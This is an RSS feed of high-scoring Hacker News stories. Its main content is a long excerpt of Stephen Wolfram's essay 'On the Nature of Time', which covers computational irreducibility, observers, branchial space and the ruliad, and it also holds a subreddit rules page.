<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Wed, 09 Oct 2024 09:30:06 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Cognizant found guilty of discriminating against non-Indian employees (120 pts)]]></title>
            <link>https://twitter.com/USTechWorkers/status/1843744799607898260</link>
            <guid>41785265</guid>
            <pubDate>Wed, 09 Oct 2024 07:05:56 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://twitter.com/USTechWorkers/status/1843744799607898260">https://twitter.com/USTechWorkers/status/1843744799607898260</a>, See on <a href="https://news.ycombinator.com/item?id=41785265">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[The human internet is dying. AI images are taking over Google top results (103 pts)]]></title>
            <link>https://old.reddit.com/r/ChatGPT/comments/1fye6tb/the_human_internet_is_dying_ai_images_taking_over/</link>
            <guid>41783787</guid>
            <pubDate>Wed, 09 Oct 2024 02:10:55 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://old.reddit.com/r/ChatGPT/comments/1fye6tb/the_human_internet_is_dying_ai_images_taking_over/">https://old.reddit.com/r/ChatGPT/comments/1fye6tb/the_human_internet_is_dying_ai_images_taking_over/</a>, See on <a href="https://news.ycombinator.com/item?id=41783787">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><hr>

<p><strong><a href="https://old.reddit.com/r/ChatGPT">r/ChatGPT</a> Rules</strong><br>
All users are encouraged to report posts to the moderators for review.</p>

<hr>

<p><strong>1: Malicious Communication</strong><br>
Posters and commenters are expected to act in good faith. Treat other users the way you want to be treated. Avoid straw-manning and bad-faith interpretations. Avoid presenting misinformation as factual.</p>

<p><strong>2: No Trashposts</strong><br>
Posts deemed to be entirely without value or effort may be removed if they have not generated interesting discussions before their discovery. Users are encouraged to report posts they feel are of significantly low effort. Specifically mentioning that “Is chat GPT down posts?” will be removed. The stickied FAQ deals with that.</p>

<p><strong>3: Self Advertising</strong><br>
Posts must be directly related to ChatGPT or the topic of LLMs. They may not be solely focused on advertising a single other LLM service. Find or establish a relative subreddit for that service.</p>

<p><strong>4: Political Discussion</strong><br>
Having ChatGPT create political content is completely fine. Discussion of the politics around AI and LLMs is allowed. This is not the place to discuss the merits of Trump's foreign policy or Hunter Biden’s laptop.</p>

<hr>

<p><strong><a href="https://discord.gg/r-chatgpt-1050422060352024636">Join us on Discord</a></strong></p>

<p><strong><a href="https://t.me/r_ChatGPT">Join us on Telegram</a></strong></p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[On the Nature of Time (268 pts)]]></title>
            <link>https://writings.stephenwolfram.com/2024/10/on-the-nature-of-time/</link>
            <guid>41782534</guid>
            <pubDate>Tue, 08 Oct 2024 22:42:01 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://writings.stephenwolfram.com/2024/10/on-the-nature-of-time/">https://writings.stephenwolfram.com/2024/10/on-the-nature-of-time/</a>, See on <a href="https://news.ycombinator.com/item?id=41782534">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <h2 id="the-computational-view-of-time">The Computational View of Time</h2>
<p>Time is a central feature of human experience. But what actually is it? In traditional scientific accounts it’s often represented as some kind of coordinate much like space (though a coordinate that for some reason is always systematically increasing for us). But while this may be a useful mathematical description, it’s not telling us anything about what time in a sense “intrinsically is”. </p>
<p>We get closer as soon as we start thinking in computational terms. Because then it’s natural for us to think of successive states of the world as being computed one from the last by the progressive application of some computational rule. And this suggests that we can identify the progress of time with the “progressive doing of <nobr id="link-test"> computation</nobr> by the universe”. </p>
<p>But does this just mean that we are replacing a “time coordinate” with a “computational step count”? No. Because of the phenomenon of <a href="https://www.wolframscience.com/nks/chap-12--the-principle-of-computational-equivalence#sect-12-6--computational-irreducibility">computational irreducibility</a>. With the traditional mathematical idea of a time coordinate one typically imagines that this coordinate can be “set to any value”, and that then one can immediately calculate the state of the system at that time. But computational irreducibility implies that it’s not that easy. Because it says that there’s often essentially no better way to find what a system will do than by explicitly tracing through each step in its evolution.<span id="more-63438"></span></p>
<p>In the pictures on the left there’s computational reducibility, and one can readily see what state will be after any number of steps <em>t</em>. But in the pictures on the right there’s (presumably) computational irreducibility, so that the only way to tell what will happen after <em>t</em> steps is effectively to run all those steps:</p>
<div>
<p><img loading="lazy" src="https://content.wolfram.com/sites/43/2024/10/sw10082024timeBimg1.png" alt="" title="" width="642" height="178"> </p>
</div>
<p>And this implies is that there’s a certain robustness to time when viewed in these computational terms. There’s no way to “jump ahead” in time; the only way to find out what will happen in the future is to go through the irreducible computational steps to get there. </p>
<p>There are simple idealized systems (say with purely periodic behavior) where there’s computational reducibility, and where there isn’t any robust notion of the progress of time. But the point is that—as the <a href="https://www.wolframscience.com/nks/chap-12--the-principle-of-computational-equivalence/">Principle of Computational Equivalence</a> implies—our universe is inevitably full of computational irreducibility which in effect defines a robust notion of the progress of time.</p>
<h2 id="the-role-of-the-observer">The Role of the Observer</h2>
<p>That time is a reflection of the progress of computation in the universe is an important starting point. But it’s not the end of the story. For example, here’s an immediate issue. If we have a computational rule that determines each successive state of a system it’s at least in principle possible to know the whole future of the system. So given this why then do we have the experience of the future only “unfolding as it happens”?</p>
<p>It’s fundamentally because of the way <a href="https://writings.stephenwolfram.com/2023/12/observer-theory/">we are as observers</a>. If the underlying system is computationally irreducible, then to work out its future behavior requires an irreducible amount of computational work. But it’s a core feature of observers like us that we are computationally bounded. So we can’t do all that irreducible computational work to “know the whole future”—and instead we’re effectively stuck just doing computation alongside the system itself, never able to substantially “jump ahead”, and only able to see the future “progressively unfold”.</p>
<p>In essence, therefore, we experience time because of the interplay between our computational boundedness as observers, and the computational irreducibility of underlying processes in the universe. If we were not computationally bounded, we could “perceive the whole of the future in one gulp” and we wouldn’t need a notion of time at all. And if there wasn’t underlying computational irreducibility there wouldn’t be the kind of “progressive revealing of the future” that we associate with our experience of time.</p>
<p>A notable feature of our everyday perception of time is that it seems to “flow only in one direction”—so that for example it’s generally much easier to remember the past than to predict the future. And this is closely related to the Second Law of thermodynamics, which (as <a href="https://writings.stephenwolfram.com/2023/02/computational-foundations-for-the-second-law-of-thermodynamics/">I’ve argued at length elsewhere</a>) is once again a result of the interplay between underlying computational irreducibility and our computational boundedness. Yes, the microscopic laws of physics may be reversible (and indeed if our system is simple—and computationally reducible—enough of this reversibility may “shine through”). But the point is that computational irreducibility is in a sense a much stronger force.</p>
<p>Imagine that we prepare a state to have orderly structure. If its evolution is computationally irreducible then this structure will effectively be “encrypted” to the point where a computationally bounded observer can’t recognize the structure. Given underlying reversibility, the structure is in some sense inevitably “still there”—but it can’t be “accessed” by a computationally bounded observer. And as a result such an observer will perceive a definite flow from orderliness in what is prepared to disorderliness in what is observed. (In principle one might think it should be possible to set up a state that will “behave antithermodynamically”—but the point is that to do so would require predicting a computationally irreducible process, which a computationally bounded observer can’t do.)</p>
<p>One of the longstanding confusions about the nature of time has to do with its “mathematical similarity” to space. And indeed ever since the early days of relativity theory it’s seemed convenient to talk about “spacetime” in which notions of space and time are bundled together.</p>
<p>But in our <a href="https://www.wolframphysics.org/" target="_blank" rel="noopener">Physics Project</a> that’s not at all how things fundamentally work. At the lowest level the state of the universe is <a href="https://writings.stephenwolfram.com/2020/04/finally-we-may-have-a-path-to-the-fundamental-theory-of-physics-and-its-beautiful/#what-is-space">represented by a hypergraph</a> which captures what can be thought of as the “spatial relations” between discrete “atoms of space”. <a href="https://writings.stephenwolfram.com/2020/04/finally-we-may-have-a-path-to-the-fundamental-theory-of-physics-and-its-beautiful/#time">Time then corresponds</a> to the progressive rewriting of this hypergraph.</p>
<p>And in a sense the “atoms of time” are the elementary “rewriting events” that occur. If the “output” from one event is needed to provide “input” to another, then we can think of the first event as preceding the second event in time—and the events as being “timelike separated”. And in general we can construct a <a href="https://writings.stephenwolfram.com/2020/04/finally-we-may-have-a-path-to-the-fundamental-theory-of-physics-and-its-beautiful/#the-graph-of-causal-relationships">causal graph</a> that shows the dependencies between different events. </p>
<p>So how does this relate to time—and spacetime? As we’ll discuss below, our everyday experience of time is that it follows a single thread. And so we tend to want to “parse” the causal graph of elementary events into a series of slices that we can view as corresponding to “successive times”. As in <a href="https://writings.stephenwolfram.com/2020/04/finally-we-may-have-a-path-to-the-fundamental-theory-of-physics-and-its-beautiful/#deriving-special-relativity">standard relativity theory</a>, there typically isn’t a unique way to assign a sequence of such “simultaneity surfaces”, with the result that there are different “reference frames” in which the identifications of space and time are different. </p>
<p>The complete causal graph bundles together what we usually think of as space with what we usually think of as time. But ultimately the progress of time is always associated with some choice of successive events that “computationally build on each other”. And, yes, it’s more complicated because of the possibilities of different choices. But the basic idea of the progress of time as “the doing of computation” is very much the same. (In a sense time represents “computational progress” in the universe, while space represents the “layout of its data structure”.)</p>
<p>Very much as in the derivation of the Second Law (or of fluid mechanics from molecular dynamics), the <a href="https://writings.stephenwolfram.com/2020/04/finally-we-may-have-a-path-to-the-fundamental-theory-of-physics-and-its-beautiful/#general-relativity-and-gravity">derivation of Einstein’s equations</a> for the large-scale behavior of spacetime from the underlying causal graph of hypergraph rewriting depends on the fact that we are computationally bounded observers. But even though we’re computationally bounded, we still have to “have something going on inside”, or we wouldn’t record—or sense—any “progress in time”.</p>
<p>It seems to be the essence of observers like us—as captured in my <a href="https://writings.stephenwolfram.com/2023/12/observer-theory/">recent Observer Theory</a>—that we equivalence many different states of the world to derive our internal perception of “what’s going on outside”. And at some rough level we might imagine that we’re sensing time passing by the rate at which we add to those internal perceptions. If we’re not adding to the perceptions, then in effect time will stop for us—as happens if we’re asleep, anesthetized or dead. </p>
<p>It’s worth mentioning that in some extreme situations it’s not the internal structure of the observer that makes perceived time stop; instead it’s the underlying structure of the universe itself. As we’ve mentioned, the “progress of the universe” is associated with successive rewriting of the underlying hypergraph. But when there’s been “too much activity in the hypergraph” (which physically corresponds roughly to too much energy-momentum), one can end up with a situation in which “there are no more rewrites that can be done”—so that in effect some part of the universe can no longer progress, <a href="https://www.wolframphysics.org/technical-introduction/potential-relation-to-physics/cosmology-expansion-and-singularities" target="_blank" rel="noopener">and “time stops” there</a>. It’s analogous to what happens at a spacelike singularity (normally associated with a black hole) in traditional general relativity. But now it has a very direct computational interpretation: one’s reached a “fixed point” at which there’s no more computation to do. And so there’s no progress to make in time.</p>
<h2 id="multiple-threads-of-time">Multiple Threads of Time</h2>
<p>Our strong human experience is that time progresses as a single thread. But now our <a href="https://writings.stephenwolfram.com/2020/04/finally-we-may-have-a-path-to-the-fundamental-theory-of-physics-and-its-beautiful/#the-inevitability-of-quantum-mechanics">Physics Project suggests</a> that at an underlying level time is actually in effect multithreaded, or, in other words, that there are many different “paths of history” that the universe follows. And it is only because of the way we as observers sample things that we experience time as a single thread. </p>
<p>At the level of a particular underlying hypergraph the point is that there may be many different updating events that can occur, and each sequence of such updating event defines a different “path of history”. We can summarize all these paths of history in a multiway graph in which we merge identical states that arise:</p>
<div>
<p><img loading="lazy" src="https://content.wolfram.com/sites/43/2024/10/sw10082024timeAimg2.png" alt="" title="" width="194" height="242"> </p>
</div>
<p>But given this underlying structure, why is it that we as observers believe that time progresses as a single thread? It all has to do with the notion of <a href="https://www.wolframphysics.org/technical-introduction/the-updating-process-for-string-substitution-systems/the-concept-of-branchial-graphs/" target="_blank" rel="noopener">branchial space</a>, and our presence within branchial space. The presence of many paths of history is what leads to quantum mechanics; the fact that we as <a href="https://writings.stephenwolfram.com/2023/12/observer-theory/#the-case-of-quantum-mechanics">observers ultimately perceive just one path</a> is associated with the traditionally-quite-mysterious phenomenon of “measurement” in quantum mechanics. </p>
<p>When we talked about causal graphs above, we said that we could “parse” them as a series of “spacelike” slices corresponding to instantaneous “states of space”—represented by spatial hypergraphs. And by analogy we can similarly imagine breaking multiway graphs into “instantaneous slices”. But now these slices don’t represent states of ordinary space; instead they represent states of what we call branchial space.</p>
<p>Ordinary space is “knitted together” by updating events that have causal effects on other events that can be thought of as “located at different places in space”. (Or, said differently, space is knitted together by the overlaps of the elementary light cones of different events.) Now we can think of branchial space as being “knitted together” by updating events that have effects on events that end up on different branches of history. </p>
<p>(In general there is a close analogy between ordinary space and branchial space, and we can define a multiway causal graph that includes both “spacelike” and “branchlike” directions—with the branchlike direction supporting not light cones but what we can call entanglement cones.)</p>
<p>So how do we as observers parse what’s going on? A key point is that we are inevitably part of the system we’re observing. So the branching (and merging) that’s going on in the system at large is also going on in us. So that means we have to ask how a “branching mind” will perceive a branching universe. Underneath, there are lots of branches, and lots of “threads of history”. And there’s lots of computational irreducibility (and even what we can call <a href="https://writings.stephenwolfram.com/2022/06/games-and-puzzles-as-multicomputational-systems/#humanizing-multicomputational-processes">multicomputational irreducibility</a>). But computationally bounded observers like us have to equivalence most of those details to wind up with something that “fits in our finite minds”. </p>
<p>We can make an analogy to what happens in a gas. Underneath, there are lots of molecules bouncing around (and behaving in computationally irreducible ways). But observers like us are big compared to molecules, and (being computationally bounded) we don’t get to perceive their individual behavior, but only their aggregate behavior—from which we extract a thin set of computationally reducible “fluid-dynamics-level” features. </p>
<p>And it’s basically the same story with the underlying structure of space. Underneath, there’s an elaborately changing network of discrete atoms of space. But as large, computationally bounded observers we can only sample aggregate features in which many details have been equivalenced, and in which space tends to seem continuous and describable in basically computationally reducible ways. </p>
<p>So what about branchial space? Well, it’s basically the same story. Our minds are “big”, in the sense that they span many individual branches of history. And they’re computationally bounded so they can’t perceive the details of all those branches, but only certain aggregated features. And in a first approximation what then emerges is in effect a single aggregated thread of history. </p>
<p>With sufficiently careful measurements we can sometimes see “quantum effects” in which multiple threads of history are in evidence. But at a direct human level we always seem to aggregate things to the point where what we perceive is just a single thread of history—or in effect a single thread of progression in time.</p>
<p>It’s not immediately obvious that any of these “aggregations” will work. It could be that important effects we perceive in gases would depend on phenomena at the level of individual molecules. Or that to understand the large-scale structure of space we’d continually be having to think about detailed features of atoms of space. Or, similarly, that we’d never be able to maintain a “consistent view of history”, and that instead we’d always be having to trace lots of individual threads of history. </p>
<p>But the key point is that for us to stay as computationally bounded observers we have to pick out only features that are computationally reducible—or in effect boundedly simple to describe. </p>
<p>Closely related to our computational boundedness is the <a href="https://writings.stephenwolfram.com/2021/03/what-is-consciousness-some-new-perspectives-from-our-physics-project/">important assumption</a> we make that we as observers have a certain persistence. At every moment in time, we are made from different atoms of space and different branches in the multiway graph. Yet we believe we are still “the same us”. And the crucial physical fact (that has to be derived in our model) is that in ordinary circumstances there’s no inconsistency in doing this.</p>
<p>So the result is that even though there are many “threads of time” at the lowest level—representing many different “quantum branches”—observers like us can (usually) successfully still view there as being a single consistent perceived thread of time.</p>
<p>But there’s another issue here. It’s one thing to say that a single observer (say a single human mind or a single measuring device) can perceive history to follow a single, consistent thread. But what about different human minds, or different measuring devices? Why should they perceive any kind of consistent “objective reality”?</p>
<p>Essentially the answer, I think, is that they’re all sufficiently nearby in branchial space. If we think about physical space, observers in different parts of the universe will clearly “see different things happening”. The “laws of physics” may be the same—but what star (if any) is nearby will be different. Yet (at least for the foreseeable future) for all of us humans it’s always the same star that’s nearby. </p>
<p>And so it is, presumably, in branchial space. There’s some small patch in which we humans—with our shared origins—exist. And it’s presumably because that patch is small relative to all of branchial space that all of us perceive a consistent thread of history and a common objective reality. </p>
<p>There are many subtleties to this, many of which aren’t yet fully worked out. In physical space, we know that effects can in principle spread at the speed of light. And in branchial space the analog is that effects can spread at the maximum entanglement speed (whose value we don’t know, though it’s <a href="https://www.wolframphysics.org/technical-introduction/potential-relation-to-physics/units-and-scales/" target="_blank" rel="noopener">related by Planck unit conversions to the elementary length and elementary time</a>). But in maintaining our shared “objective” view of the universe it’s crucial that we’re not all going off in different directions at the speed of light. And of course the reason that doesn’t happen is that we don’t have zero mass. And indeed presumably nonzero mass is a critical part of being observers like us. </p>
<p>In our Physics Project it’s roughly the density of events in the hypergraph that determines the density of energy (and mass) in physical space (with their associated gravitational effects). And similarly it’s roughly the density of events in the multiway graph (or in branchial graph slices) that determines the density of action—the relativistically invariant analog of energy—in branchial space (with its associated effects on quantum phase). And though it’s not yet completely clear how this works, it seems likely that once again when there’s mass, effects don’t just “go off at the maximum entanglement speed in all directions”, but instead stay nearby.</p>
<p>There are definitely connections between “staying at the same place”, believing one is persistent, and being computationally bounded. But these are what seem necessary for us to have our typical view of time as a single thread. In principle we can imagine observers very different from us—say with minds (like the inside of an idealized quantum computer) capable of experiencing many different threads of history. But the Principle of Computational Equivalence suggests that there’s a high bar for such observers. They need not only to be able to deal with computational irreducibility but also multicomputational irreducibility, in which one includes both the process of computing new states, and the process of equivalencing states. </p>
<p>And so for observers that are “anything like us” we can expect that once again time will tend to be as we normally experience it, following a single thread, consistent between observers. </p>
<p>(It’s worth mentioning that all of this only works for observers like us “in situations like ours”. For example, at the <a href="https://www.wolframphysics.org/technical-introduction/potential-relation-to-physics/event-horizons-and-singularities-in-spacetime-and-quantum-mechanics/" target="_blank" rel="noopener">“entanglement horizon” for a black hole</a>—where branchially-oriented edges in the multiway causal graph get “trapped”—time as we know it in some sense “disintegrates”, because an observer won’t be able to “knit together” the different branches of history to “form a consistent classical thought” about what happens.)</p>
<h2 id="time-in-the-ruliad">Time in the Ruliad</h2>
<p>In what we’ve discussed so far we can think of the progress of time as being associated with the repeated application of rules that progressively “rewrite the state of the universe”. In the previous section we saw that these rules can be applied in many different ways, leading to many different underlying threads of history. </p>
<p>But so far we’ve imagined that the rules that get applied are always the same—leaving us with the mystery of “Why those rules, and not others?” But this is where <a href="https://writings.stephenwolfram.com/2021/11/the-concept-of-the-ruliad/">the ruliad</a> comes in. Because the ruliad involves no such seemingly arbitrary choices: it’s what you get by following all possible computational rules.</p>
<p>One can imagine many bases for the ruliad. One can make it from all possible hypergraph rewritings. Or all possible (multiway) Turing machines. But in the end it’s a single, unique thing: the entangled limit of all possible computational processes. There’s a sense in which “everything can happen somewhere” in the ruliad. But what gives the ruliad structure is that there’s a definite (essentially geometrical) way in which all those different things that can happen are arranged and connected.</p>
<p>So what is our perception of the ruliad? Inevitably we’re part of the ruliad—so we’re observing it “from the inside”. But the crucial point is that what we perceive about it depends on what we are like as observers. And my big surprise in the past few years has been that assuming even just a little about what we’re like as observers immediately implies that what we perceive of the ruliad follows the core laws of physics we know. In other words, by assuming what we’re like as observers, we can in effect derive our laws of physics.</p>
<p>The key to all this is the interplay between the computational irreducibility of underlying behavior in the ruliad, and our computational boundedness as observers (together with our related assumption of our persistence). And it’s this interplay that gives us the Second Law in statistical mechanics, the Einstein equations for the structure of spacetime, and (we think) the path integral in quantum mechanics. In effect what’s happening is that our computational boundedness as observers makes us equivalence things to the point where we are sampling only computationally reducible slices of the ruliad, whose characteristics can be described using recognizable laws of physics.</p>
<p>So where does time fit into all of this? A central feature of the ruliad is that it’s unique—and everything about it is “abstractly necessary”. Much as given the definition of numbers, addition and equality it’s inevitable that one gets 1 + 1 = 2, so similarly given the definition of computation it’s inevitable that one gets the ruliad. Or, in other words, there’s no question about whether the ruliad exists; it’s just an abstract construct that inevitably follows from abstract definitions. </p>
<p>And so at some level this means that the ruliad inevitably just “exists as a complete thing”. And so if one could “view it from outside” one could think of it as just a single timeless object, with no notion of time. </p>
<p>But the crucial point is that we don’t get to “view it from the outside”. We’re embedded within it. And, what’s more, we must view it through the “lens” of our computational boundedness. And this is why we inevitably end up with a notion of time. </p>
<p>We observe the ruliad from some point within it. If we were not computationally bounded then we could immediately compute what the whole ruliad is like. But in actuality we can only discover the ruliad “one computationally bounded step at a time”—in effect progressively applying bounded computations to “move through rulial space”. </p>
<p>So even though in some abstract sense “the whole ruliad is already there” we only get to explore it step by step. And that’s what gives us our notion of time, through which we “progress”. </p>
<p>Inevitably, there are many different paths that we could follow through the ruliad. And indeed every mind (and every observer like us)—with its distinct inner experience—presumably follows a different path. But much as we described for branchial space, the reason we have a shared notion of “objective reality” is presumably that we are all very close together in rulial space; we form in a sense a tight “rulial flock”.</p>
<p>It’s worth pointing out that not every sampling of the ruliad that may be accessible to us conveniently corresponds to exploration of progressive slices of time. Yes, that kind of “progression in time” is characteristic of our physical experience, and our typical way of describing it. But what about our experience, say, of mathematics?</p>
<p>The first point to make is that just as the ruliad contains all possible physics, it also <a href="https://writings.stephenwolfram.com/2022/03/the-physicalization-of-metamathematics-and-its-implications-for-the-foundations-of-mathematics/">contains all possible mathematics</a>. If we construct the ruliad, say from hypergraphs, the nodes are now not “atoms of space”, but instead abstract elements (that in general <a href="https://writings.stephenwolfram.com/2022/03/the-physicalization-of-metamathematics-and-its-implications-for-the-foundations-of-mathematics/#metamath-emes">we call emes</a>) that form pieces of mathematical expressions and mathematical theorems. We can think of these abstract elements as being laid out now not in physical space, but in some abstract metamathematical space. </p>
<p>In our physical experience, we tend to remain localized in physical space, branchial space, etc. But in “doing mathematics” it’s more as if we’re progressively expanding in metamathematical space, carving out some domain of “theorems we assume are true”. And while we could identify some kind of “path of expansion” to let us define some analog of time, it’s not a necessary feature of the way we explore the ruliad.</p>
<p>Different places in the ruliad in a sense correspond to describing things using different rules. And by analogy to the concept of motion in physical space, we can effectively “move” from one place to another in the ruliad by translating the computations done by one set of rules to computations done by another. (And, yes, it’s nontrivial to even have the <a href="https://writings.stephenwolfram.com/2022/03/on-the-concept-of-motion/">possibility of “pure motion”</a>.) But if we indeed remain localized in the ruliad (and can maintain what we can think of as our “coherent identity”) then it’s natural to think of there being a “path of motion” along which we progress “with time”. But when we’re just “expanding our horizons” to encompass more paradigms and to bring more of rulial space into what’s covered by our minds (so that in effect we’re “expanding in rulial space”), it’s not really the same story. We’re not thinking of ourselves as “doing computation in order to move”. Instead, we’re just identifying equivalences and using them to expand our definition of ourselves, which is something that we can at least approximate (much like in “quantum measurement” in traditional physics) as happening “outside of time”. Ultimately, though, everything that happens must be the result of computations that occur. It’s just that we don’t usually “package” these into what we can describe as a definite thread of time.</p>
<h2 id="so-what-in-the-end-is-time">So What in the End Is Time?</h2>
<p>From the paradigm (and Physics Project ideas) that we’ve discussed here, the question “What is time?” is at some level simple: time is what progresses when one applies computational rules. But what’s critical is that time can in effect be defined abstractly, independent of the details of those rules, or the “substrate” to which they’re applied. And what makes this possible is the Principle of Computational Equivalence, and the ubiquitous phenomenon of computational irreducibility that it implies.</p>
<p>To begin with, the fact that time can robustly be thought of as “progressing”, in effect in a linear chain, is a consequence of computational irreducibility—because computational irreducibility is what tells us that computationally bounded observers like us can’t in general ever “jump ahead”; we just have to follow a linear chain of steps. </p>
<p>But there’s something else as well. The Principle of Computational Equivalence implies that there’s in a sense just one (ubiquitous) kind of computational irreducibility. So when we look at different systems following different irreducible computational rules, there’s inevitably a certain universality to what they do. In effect they’re all “accumulating computational effects” in the same way. Or in essence progressing through time in the same way.</p>
<p>There’s a close analogy here with heat. It could be that there’d be detailed molecular motion that even on a large scale <a href="https://writings.stephenwolfram.com/2023/01/how-did-we-get-here-the-tangled-history-of-the-second-law-of-thermodynamics/#what-is-heat">worked noticeably differently in different materials</a>. But the fact is that we end up being able to characterize any such motion just by saying that it represents a certain amount of heat, without getting into more details. And that’s very much the same kind of thing as being able to say that such-and-such an amount of time has passed, without having to get into the details of how some clock or other system that reflects the passage of time actually works.</p>
<p>And in fact there’s more than a “conceptual analogy” here. Because the <a href="https://writings.stephenwolfram.com/2023/02/computational-foundations-for-the-second-law-of-thermodynamics/">phenomenon of heat is again a consequence of computational irreducibility</a>. And the fact that there’s a uniform, “abstract” characterization of it is a consequence of the universality of computational irreducibility.</p>
<p>It’s worth emphasizing again, though, that just as with heat, a robust concept of time depends on us being computationally bounded observers. If we were not, then we’d able to break the Second Law by doing detailed computations of molecular processes, and we wouldn’t just describe things in terms of randomness and heat. And similarly, we’d be able to break the linear flow of time, either jumping ahead or following different threads of time. </p>
<p>But as computationally bounded observers of computationally irreducible processes, it’s basically inevitable that—at least to a good approximation—we’ll view time as something that forms a single one-dimensional thread. </p>
<p>In traditional mathematically based science there’s often a feeling that the goal should be to “predict the future”—or in effect to “outrun time”. But computational irreducibility tells us that in general we can’t do this, and that the only way to find out what will happen is just to run the same computation as the system itself, essentially step by step. But while this might seem like a letdown for the power of science, we can also see it as what gives meaning and significance to time. If we could always jump ahead then at some level nothing would ever fundamentally be achieved by the <a href="https://www.wolframscience.com/nks/chap-12--the-principle-of-computational-equivalence#sect-12-7--the-phenomenon-of-free-will">passage of time (or, say, by the living of our lives)</a>; we’d always be able to just say what will happen, without “living through” how we got there. But computational irreducibility gives time and the process of it passing a kind of hard, tangible character.</p>
<p>So what does all this imply for the various classic issues (and apparent paradoxes) that arise in the way time is usually discussed? </p>
<p>Let’s start with the question of reversibility. The traditional laws of physics basically apply both forwards and backwards in time. And the ruliad is inevitably symmetrical between “forward” and “backward” rules. So why is it then that in our typical experience time always seems to “run in the same direction”? </p>
<p>This is closely related to the Second Law, and once again it’s consequence of our computational boundedness interacting with underlying computational irreducibility. In a sense what defines the direction of time for us is that we (typically) find it much easier to remember the past than to predict the future. Of course, we don’t remember every detail of the past. We only remember what amounts to certain “filtered” features that “fit in our finite minds”. And when it comes to predicting the future, we’re limited by our inability to “outrun” computational irreducibility. </p>
<p>Let’s recall how the Second Law works. It basically says that if we set up some state that’s “ordered” or “simple” then this will tend to “degrade” to one that’s “disordered” or “random”. (We can think of the evolution of the system as effectively “encrypting” the specification of our starting state to the point where we—as computationally bounded observers—can no longer recognize its ordered origins.) But because our underlying laws are reversible, this degradation (or “encryption”) must happen when we go both forwards and backwards in time:</p>
<div>
<p><img loading="lazy" src="https://content.wolfram.com/sites/43/2024/10/sw10082024timeAimg3.png" alt="" title="" width="169" height="167"> </p>
</div>
<p>But the point is that our “experiential” definition of the direction of time (in which the “past” is what we remember, and the “future” is what we find hard to predict) is inevitably aligned with the “thermodynamic” direction of time we observe in the world at large. And the reason is that in both cases we’re defining the past to be something that’s computationally bounded (while the future can be computationally irreducible). In the experiential case the past is computationally bounded because that’s what we can remember. In the thermodynamic case it’s computationally bounded because those are the states we can prepare. In other words, the “arrows of time” are aligned because in both cases we are in effect “requiring the past to be simpler”. </p>
<p>So what about time travel? It’s a concept that seems natural—and perhaps even inevitable—if one imagines that “time is just like space”. But it becomes a lot less natural when we think of time in the way we’re doing here: as a process of applying computational rules. </p>
<p>Indeed, at the lowest level, these rules are by definition just sequentially applied, producing one state after another—and in effect “progressing in one direction through time”. But things get more complicated if we consider not just the raw, lowest-level rules, but what we might actually observe of their effects. For example, what if the rules lead to a state that’s identical to one they’ve produced before (as happens, for example, in a system with periodic behavior)? If we equivalence the state now and the state before (so we represent both as a single state) then we can <a href="https://writings.stephenwolfram.com/2020/04/finally-we-may-have-a-path-to-the-fundamental-theory-of-physics-and-its-beautiful/#black-holes-singularities-etc">end up with a loop in our causal graph (a “closed timelike curve”)</a>. And, yes, in terms of the raw sequence of applying rules these states can be considered different. But the point is that if they are identical in every feature then any observer will inevitably consider them the same. </p>
<p>But will such equivalent states ever actually occur? As soon as there’s computational irreducibility it’s basically inevitable that the states will never perfectly match up. And indeed for the states to contain an observer like us (with “memory”, etc.) it’s basically impossible that they can match up. </p>
<p>But can one imagine an observer (or a “timecraft”) that would lead to states that match up? Perhaps somehow it could carefully pick particular sequences of atoms of space (or elementary events) that would lead it to states that have “happened before”. And indeed in a computationally simple system this might be possible. But as soon as there’s computational irreducibility, this simply isn’t something one can expect any computationally bounded observer to be able to do. And, yes, this is directly analogous to why one <a href="https://writings.stephenwolfram.com/2023/02/computational-foundations-for-the-second-law-of-thermodynamics/#maxwells-demon-and-the-character-of-observers">can’t have a “Maxwell’s demon”</a> observer that “breaks the Second Law”. Or why one can’t have something that carefully navigates the lowest-level structure of space to <a href="https://writings.stephenwolfram.com/2020/10/faster-than-light-in-our-model-of-physics-some-preliminary-thoughts/">effectively travel faster than light</a>. </p>
<p>But even if there can’t be time travel in which “time for an observer goes backwards”, there can still be changes in “perceived time”, say as a result of relativistic effects associated with motion. For example, one classic relativistic effect is time dilation, in which “time goes slower” when objects go faster. And, yes, given certain assumptions, there’s a straightforward mathematical derivation of this effect. But in our effort to understand the nature of time we’re led to ask what its physical mechanism might be. And it turns out that in our Physics Project it has a surprisingly direct—and almost “mechanical”—explanation.</p>
<p>One starts from the fact that in our Physics Project space and everything in it is represented by a hypergraph which is continually getting rewritten. And the evolution of any object through time is then defined by these rewritings. But if the object moves, then in effect it has to be “re-created at a different place in space”—and this process takes up a certain number of rewritings, leaving fewer for the intrinsic evolution of the object itself, and thus causing time to effectively “run slower” for it. (And, yes, while this is a qualitative description, one can make it quite formal and precise, and recover the usual formulas for relativistic time dilation.)</p>
<p>Something similar happens with gravitational fields. In our Physics Project, energy-momentum (and thus gravity) is effectively associated with greater activity in the underlying hypergraph. And the presence of this greater activity leads to more rewritings, causing “time to run faster” for any object in that region of space (corresponding to the traditional “gravitational redshift”). </p>
<p>More extreme versions of this occur in the context of black holes. (Indeed, one can roughly think of spacelike singularities as places where “time ran so fast that it ended”.) And in general—as we discussed above—there are many “relativistic effects” in which notions of space and time get mixed in various ways. </p>
<p>But even at a much more mundane level there’s a certain crucial relationship between space and time for observers like us. The key point is that observers like us tend to “parse” the world into a sequence of “states of space” at successive “moments in time”. But the fact that we do this depends on some quite specific features of us, and in particular our effective physical scale in space as compared to time. </p>
